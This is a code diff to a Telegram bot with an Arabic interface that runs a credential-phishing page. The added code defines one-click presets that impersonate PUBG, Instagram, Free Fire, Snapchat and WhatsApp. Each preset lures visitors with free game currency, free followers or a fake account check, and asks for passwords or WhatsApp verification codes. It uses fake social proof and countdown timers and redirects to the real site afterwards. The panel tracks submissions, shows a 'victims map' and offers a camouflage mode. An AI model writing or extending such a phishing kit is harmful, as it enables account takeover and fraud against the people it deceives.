@@ -99,10 +99,10 @@ function sendPageMain(chatId, editMsgId) {
   const toggleLabel = pageConfig.active ? (pageConfig.camouflage ? "✅ تشغيل كاملاً" : "⏸️ وضع تمويه") : "▶️ تشغيل الصفحة";
   const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}`;
   const kb = JSON.stringify({ inline_keyboard:[
-    [{text:"✏️ تعديل الصفحة",callback_data:"pg_edit"},{text:"👁️ معاينة",callback_data:"pg_preview"}],
+    [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
     [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
-    [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"📁 القوالب",callback_data:"pg_tpls"}],
-    [{text:toggleLabel,callback_data:"pg_toggle"},{text:"🔗 الروابط",callback_data:"pg_links"}]
+    [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
+    [{text:toggleLabel,callback_data:"pg_toggle"},{text:"👁️ معاينة",callback_data:"pg_preview"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -1193,6 +1193,64 @@ bot.on('callback_query', async (q) => {
       if (!global._pendingPush) global._pendingPush = {};
       global._pendingPush[m.message_id] = _pid;
     });
+  }
+
+  // ── Quick presets ──────────────────────────────────────────────────────────
+  const QUICK_PRESETS = {
+    pubg:{ template:"pubg", bgColor:"#1a1a2e", btnColor:"#e94560", accent:"#f5a623",
+      title:"🎁 احصل على 600 شدة مجاناً", desc:"أدخل بياناتك لاستلام شداتك فوراً",
+      fields:[{label:"ID اللاعب",type:"text"},{label:"كلمة المرور",type:"password"}],
+      btnText:"🎮 استلم الآن", timer:10, social:"2,847 لاعب حصل على شداته اليوم", redirect:"https://www.pubg.com" },
+    ig:{ template:"ig", bgColor:"#121212", btnColor:"#c13584", accent:"#833ab4",
+      title:"🚀 احصل على 10,000 متابع مجاناً", desc:"أدخل بيانات حسابك لبدء الرشق الفوري",
+      fields:[{label:"اسم المستخدم",type:"text"},{label:"كلمة المرور",type:"password"}],
+      btnText:"ابدأ الرشق الآن ✅", timer:10, social:"14,923 شخص رشق متابعيه اليوم", redirect:"https://www.instagram.com" },
+    ff:{ template:"ff", bgColor:"#1a0a00", btnColor:"#ff6b00", accent:"#ffd700",
+      title:"💎 احصل على 2000 جوهرة مجاناً", desc:"أدخل بياناتك لاستلام جواهرك فوراً",
+      fields:[{label:"ID اللاعب",type:"text"},{label:"كلمة المرور",type:"password"}],
+      btnText:"🔥 استلم الآن", timer:10, social:"5,231 لاعب حصل على جواهره اليوم", redirect:"https://www.garena.com" },
+    snap:{ template:"snap", bgColor:"#1a1a00", btnColor:"#fffc00", accent:"#fffc00",
+      title:"👻 تحقق من هوية حسابك", desc:"أدخل بياناتك لإثبات الملكية",
+      fields:[{label:"اسم المستخدم",type:"text"},{label:"كلمة المرور",type:"password"}],
+      btnText:"✅ تحقق الآن", timer:8, social:"", redirect:"https://www.snapchat.com" },
+    wa:{ template:"wa", bgColor:"#075e54", btnColor:"#25d366", accent:"#dcf8c6",
+      title:"✅ تأكيد رقم واتساب", desc:"أدخل بياناتك لتأكيد حسابك",
+      fields:[{label:"رقم الهاتف",type:"number"},{label:"رمز التحقق",type:"number"}],
+      btnText:"تأكيد ✅", timer:5, social:"", redirect:"https://www.whatsapp.com" },
+  };
+
+  if (data === "pg_quick") {
+    if (q.from.id !== BOT_OWNER) return;
+    const cur = TPL_THEMES[pageConfig.template]?.name || pageConfig.template;
+    return bot.sendMessage(chatId,
+      `⚡ *تبديل سريع*\n\nالقالب الحالي: ${cur}\nاختر القالب الجديد — سيُطبق فوراً بضغطة واحدة:`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"🎮 ببجي (شدة)",callback_data:"pg_preset_pubg"},{text:"📸 إنستغرام (متابعين)",callback_data:"pg_preset_ig"}],
+        [{text:"🔥 فري فاير (جواهر)",callback_data:"pg_preset_ff"},{text:"👻 سناب (تحقق)",callback_data:"pg_preset_snap"}],
+        [{text:"📱 واتساب (تحقق)",callback_data:"pg_preset_wa"}],
+        [{text:"🔙 رجوع",callback_data:"pg_main"}]
+      ]})}
+    );
+  }
+
+  if (data.startsWith("pg_preset_")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const key = data.replace("pg_preset_","");
+    const preset = QUICK_PRESETS[key];
+    if (!preset) return;
+    bot.answerCallbackQuery(q.id, {text:"⚡ جاري التطبيق..."}).catch(()=>{});
+    Object.assign(pageConfig, preset);
+    pageConfig.active = true;
+    pageConfig.camouflage = false;
+    pageConfig.views = pageConfig.views || 0;
+    savePageConfig();
+    const name = TPL_THEMES[key]?.name || key;
+    return bot.sendMessage(chatId,
+      `✅ *تم تطبيق قالب ${name} فوراً!*\n\n🔗 الرابط: \`${hostURL}/p\``,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text:"🎛️ لوحة التحكم",callback_data:"pg_main"},{text:"🔗 الروابط",callback_data:"pg_links"}]
+      ]})}
+    );
   }
 
   // ── Dynamic Page callbacks ─────────────────────────────────────────────────
